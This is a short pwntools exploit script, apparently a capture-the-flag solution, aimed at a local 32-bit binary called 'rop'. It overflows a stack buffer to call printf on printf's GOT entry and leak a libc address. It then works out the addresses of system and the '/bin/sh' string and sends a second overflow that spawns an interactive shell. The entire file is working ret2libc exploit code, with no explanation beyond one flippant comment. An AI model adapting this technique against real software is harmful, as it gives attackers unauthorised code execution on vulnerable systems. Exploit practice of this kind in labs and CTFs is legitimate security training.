#!/usr/bin/env python2

from pwn import *

elf = ELF('./rop')
libc = ELF('./libc.so.6')
p = process('./rop')

pop_ebx = 0x08048409
main = elf.symbols['main']
printf = elf.plt['printf']
printf_got = elf.got['printf']

p.recv()

# just call gets on each variable and overwrite lmao
payload = 'A'*28
payload += p32(printf)
payload += p32(main)
payload += p32(printf_got)

p.sendline(payload)

leak = u32(p.recv()[:4])
libc.address = leak - libc.symbols['printf']
system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))

log.info('Leak: ' + hex(leak))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('/bin/sh: ' + hex(bin_sh))

# Redo buffer overflow
payload = 'A'*28
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

p.sendline(payload)

p.interactive()
